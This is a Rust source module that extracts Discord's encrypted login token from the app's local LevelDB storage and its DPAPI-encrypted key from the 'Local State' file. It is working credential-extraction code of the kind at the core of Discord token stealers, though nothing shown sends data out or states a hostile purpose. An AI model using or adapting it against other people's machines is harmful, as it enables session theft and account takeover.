use crate::error::ExtractDiscordTokenError;
use crate::string_key::StringKey;
use base64::{engine::general_purpose, Engine};
use leveldb::database::Database;
use leveldb::kv::KV;
use leveldb::options::{Options, ReadOptions};
use std::fs;
use std::path::Path;

// Relative to %appdata% directory
const DISCORD_PATH: &str = "discord";

const TEMPDIR_NAME: &str = "discord-tmp";

const LEVELDB_TOKEN_KEY: &str = "_https://discord.com\x00\x01token";
const V10_PREFIX: &[u8] = b"v10";

const DPAPI_PREFIX: &[u8] = b"DPAPI";

fn copy_dir(src: &Path, dst: &Path) -> Result<(), std::io::Error> {
    if fs::metadata(dst).is_err() {
        fs::create_dir_all(dst)?;
    }

    for entry in fs::read_dir(src)? {
        let file_path = entry?.path();
        if let Some(file_name) = file_path.file_name() {
            fs::copy(&file_path, dst.join(file_name))?;
        }
    }

    Ok(())
}

pub fn extract_encrypted_token(
    appdata_dir: &Path,
    temp_dir: &Path,
) -> Result<Vec<u8>, ExtractDiscordTokenError> {
    // We copy the database into a temporary directory to avoid db file locks
    let leveldb_path = appdata_dir
        .join(DISCORD_PATH)
        .join("Local Storage")
        .join("leveldb");
    let temp_db_path = temp_dir.join(TEMPDIR_NAME);
    copy_dir(&leveldb_path, &temp_db_path)?;

    let database = Database::<StringKey>::open(&temp_db_path, Options::new())?;

    let key = StringKey::new(LEVELDB_TOKEN_KEY);
    let result = database.get(ReadOptions::new(), key)?;

    // Drop the database object explicitly to avoid running into problems with
    // the leveldb implementation and then remove the copied temp dir again
    drop(database);
    let _ = fs::remove_dir_all(temp_dir);

    if let Some(mut encoded_token) = result {
        // Get the start of the token (after ':')
        let start_pos = match encoded_token.iter().position(|&x| x == b':') {
            Some(idx) => idx + 1,
            None => 0,
        };

        // Trim the end (token value ends with '"')
        if encoded_token.last() == Some(&b'"') {
            encoded_token.pop();
        }

        // Trim the token
        let b64token = String::from_iter(encoded_token.iter().skip(start_pos).map(|b| *b as char));
        let mut token = general_purpose::STANDARD.decode(b64token)?;

        if token.drain(0..V10_PREFIX.len()).as_slice() != V10_PREFIX {
            return Err(ExtractDiscordTokenError::ExpectedValue(
                "Expected decoded token to have the v10 prefix",
            ));
        }

        Ok(token)
    } else {
        Err(leveldb::error::Error::new(
            "Login token is not present in LocalStorage LevelDB".to_string(),
        )
        .into())
    }
}

pub fn extract_encrypted_key(appdata_dir: &Path) -> Result<Vec<u8>, ExtractDiscordTokenError> {
    let local_state = fs::File::open(appdata_dir.join(DISCORD_PATH).join("Local State"))?;
    let parsed: serde_json::Value = serde_json::from_reader(local_state)?;
    let key_value = parsed
        .get("os_crypt")
        .ok_or(ExtractDiscordTokenError::Parsing(
            "os_crypt property not found in Local Storage JSON",
        ))?
        .get("encrypted_key")
        .ok_or(ExtractDiscordTokenError::Parsing(
            "encrypted_key property not found in Local Storage JSON",
        ))?;

    let key_b64 = key_value.as_str().ok_or(ExtractDiscordTokenError::Parsing(
        "encrypted_key property in Local Storage JSON is not a string",
    ))?;

    let mut key = general_purpose::STANDARD.decode(key_b64)?;

    if key.drain(0..DPAPI_PREFIX.len()).as_slice() != DPAPI_PREFIX {
        return Err(ExtractDiscordTokenError::ExpectedValue(
            "Expected decoded encrypted token to have the DPAPI prefix",
        ));
    }

    Ok(key)
}
